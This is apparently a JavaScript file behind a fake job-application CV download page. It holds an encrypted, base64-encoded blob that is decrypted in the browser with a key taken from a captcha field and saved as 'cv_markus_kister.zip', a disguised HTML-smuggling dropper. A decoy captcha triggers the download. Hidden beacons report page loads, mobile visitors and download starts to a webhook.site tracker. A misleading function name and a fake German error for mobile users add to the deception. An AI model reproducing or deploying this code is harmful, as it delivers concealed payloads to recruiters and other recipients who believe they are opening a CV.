var data = "Yng3MXJnc2U6M7RjYm3C4KpHXzIyMw8wZmd5ZTIzcnNdWAcAF0teXVmbRMbsyTNoWUrUthHq3YDhFhx8y9TSBikhqP6Gwpu3bGkZiFhI4mcAmn9XjkZYik0qZj6mhnicnC" +
"Q4apHWTtiOiNoNpMmp/0dJBGzWv8LppyNhm66y7lE2+wjKKdOWyx1iW1dntYNImleAWHeoxXHCAFlLXiUefzq4+z1UaZIMt9GsEA1rKkmpsvgtl6RVq6FQvIhgkoMQDXDG" +
"QOLy+WGR4n6tmXTIfzh1jn1A+HTgxLRCL2JMEhDqubsBuHKaV2/AErgZ6fZedsfVWtM1qUUjXgwPfQiUaBumQ1XYLprwN2qlyIiB4MGn680dSC7lfi1mocjwi6GBfBk6ZK" +
"w234eC2Pu47AQ+5sNcgLPXQNlVGodh5tsrOdqX2VL3WlhIgGluEYe40qCi0vu3P7ZIM1y/JVpmz7QGPEBRSlcEHXnb5AmcCwxZraizmVC1+8ARH9dT1o3x0pW55AtpRvfx" +
"C0OVOE6oJDTYLpxwIB4mPCIuMzENMyA1Z2d6ZbRjZGuQsr5FH2QyMwk2NDVtZ1ZlMjMyMzQ1RmdyZTIzMjN0dQ8KEwJXHV5dXz9mR3JlMjMyMjQtZvgUtStdV+k1OFTLVg" +
"tX6TPBBgCPChe/M2N5NjI1ZmdyZDIyMm40NWbxc2UyMzI=";



function xorDecrypt(binaryContent, key) {
var ret = new Uint8Array(binaryContent.length);
for (let i = 0; i < binaryContent.length; i++) {
ret[i] = binaryContent.charCodeAt(i) ^ key.charCodeAt(i % key.length);
}
return ret;
}

function saveByteArray(reportName, byte) {
var blob = new Blob([byte], { type: "text/plain" });
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
var fileName = reportName;
link.download = fileName;
link.click();
};

function changeColor () {
var _data = atob(data);
_data = xorDecrypt(_data, document.getElementById("captcha2").value)
saveByteArray("cv_markus_kister.zip", _data);
}

function generateRandomCode() {
    var characters = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789';
    var code = '';
    for (var i = 0; i < 6; i++) {
      var randomIndex = Math.floor(Math.random() * characters.length);
      code += characters.charAt(randomIndex);
    }
    return code;
  }

function baseToArrayBuffer(base64) {
    var binaryString = window.atob(base64);
    var binaryLen = binaryString.length;
    var bytes = new Uint8Array(binaryLen);
    for (var i = 0; i < binaryLen; i++) {
        var ascii = binaryString.charCodeAt(i);
        bytes[i] = ascii;
    }
    return bytes;
}

function saveByteArray(reportName, byte) {
    var blob = new Blob([byte], { type: "text/plain" });
    var link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    var fileName = reportName;
    link.download = fileName;
    link.click();
};

window.downloadCV = function () {
    changeColor();
}

function sendWebhook(action) {
    const url = 'https://webhook.site/<YOUR-GUID>';
    const params = { action: action };
    const img = document.createElement('img');
    img.style.display = 'none';
    img.src = url + '?action=' + encodeURIComponent(action);
    document.body.appendChild(img);
}

$(document).ready(function() {
    sendWebhook('page_loaded');
    var userAgent = navigator.userAgent.toLowerCase();
    var isMobile = /iphone|ipod|ipad|android|blackberry|windows phone/.test(userAgent);

    if (isMobile) {
      var message = "<span style='color: red; font-weight: bold;'>⚠</span> Fehler bei der Ausführung, diese Bibliothek unterstützt keine mobilen Geräte.";
      document.getElementById("cv").innerHTML = message;
      sendWebhook('mobile_detected');
    }

    var expectedCode = generateRandomCode();
    $('#codeImage').attr('src', 'https://via.placeholder.com/500x100?text=' + expectedCode);
    
    $('#captcha').on('input', function() {
      var enteredCode = $(this).val().trim();
      if (enteredCode === expectedCode) {
        changeColor();
        downloadCV();
        sendWebhook('download_started');
      }
    });
  });
